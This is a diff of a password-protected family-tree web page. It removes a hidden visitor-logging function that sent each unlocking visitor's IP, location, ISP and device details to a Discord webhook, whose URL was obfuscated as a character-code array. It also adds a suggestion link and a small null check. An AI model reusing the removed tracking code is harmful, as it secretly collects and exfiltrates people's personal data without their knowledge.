@@ -167,30 +167,6 @@ svg { width: 100%; height: 100%; }
   </div>
 </div>
 <script>
-function logVisitor() {
-  fetch('https://ipapi.co/json/')
-    .then(r => r.json())
-    .then(geo => {
-      const info = {
-        ip: geo.ip,
-        city: geo.city,
-        region: geo.region,
-        country: geo.country_name,
-        isp: geo.org || '',
-        device: navigator.userAgent,
-        screen: screen.width + 'x' + screen.height,
-        time: new Date().toLocaleString()
-      };
-      const msg = `**Visitor**\n🌐 ${info.ip} | ${info.city}, ${info.region}, ${info.country}\n📡 ${info.isp}\n💻 ${info.device}\n📐 ${info.screen}\n🕐 ${info.time}`;
-      const _h = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,51,56,57,52,50,55,48,51,49,51,48,49,50,48,52,54,51,47,98,81,69,103,70,86,110,87,66,107,109,122,115,82,79,122,84,51,57,119,120,89,105,71,95,72,69,117,71,97,119,115,45,113,104,117,74,98,51,121,84,102,101,68,52,104,72,56,73,72,97,116,101,77,73,121,87,115,84,76,99,118,48,98,76,116,88,104];
-      fetch(String.fromCharCode(..._h), {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: msg })
-      }).catch(() => {});
-    }).catch(() => {});
-}
-
 async function deriveKey(password, salt) {
   const enc = new TextEncoder();
   const keyMaterial = await crypto.subtle.importKey('raw', enc.encode(password), 'PBKDF2', false, ['deriveKey']);
@@ -227,7 +203,6 @@ async function checkGatePassword() {
     window._decryptedData = await decryptData(input);
     document.getElementById('password-gate').style.display = 'none';
     sessionStorage.setItem('fke-auth-key', input);
-    logVisitor();
     init();
   } catch (e) {
     errorEl.style.display = 'block';
@@ -240,7 +215,6 @@ async function checkGatePassword() {
     try {
       window._decryptedData = await decryptData(saved);
       document.getElementById('password-gate').style.display = 'none';
-      logVisitor();
       init();
     } catch (e) {
       sessionStorage.removeItem('fke-auth-key');
@@ -261,6 +235,7 @@ async function checkGatePassword() {
   <button id="find-btn" onclick="openFinder()">Find Relationship</button>
   <button id="lang-toggle" onclick="toggleLang()">HI / EN</button>
   <button style="padding:6px 10px;border-radius:4px;border:1px solid #0f3460;background:#1a1a2e;color:#999;cursor:pointer;font-size:11px;" onclick="resetZoom()">Reset Zoom</button>
+  <a href="suggest.html" style="padding:6px 12px;border-radius:4px;border:1px solid #0f3460;background:#e94560;color:#fff;cursor:pointer;font-size:11px;text-decoration:none;font-weight:bold;">+ Suggest a Member</a>
 </div>
 
 <div id="breadcrumb"></div>
@@ -705,6 +680,7 @@ class FamilyLayout {
 // Load data and initialize
 async function init() {
   const data = window._decryptedData;
+  if (!data) return;
   graph = new FamilyGraph(data);
   resolver = new KinshipResolver(KINSHIP_RULES_HI);
 
@@ -1310,7 +1286,7 @@ function resetZoom() {
   svg.setAttribute('viewBox', `${viewBox.x} ${viewBox.y} ${viewBox.w} ${viewBox.h}`);
 }
 
-// ZoomPan initializes immediately; data init happens after password
+// Zoom/pan is set up immediately; data loads after password entry
 initZoomPan();
 </script>
 </body>
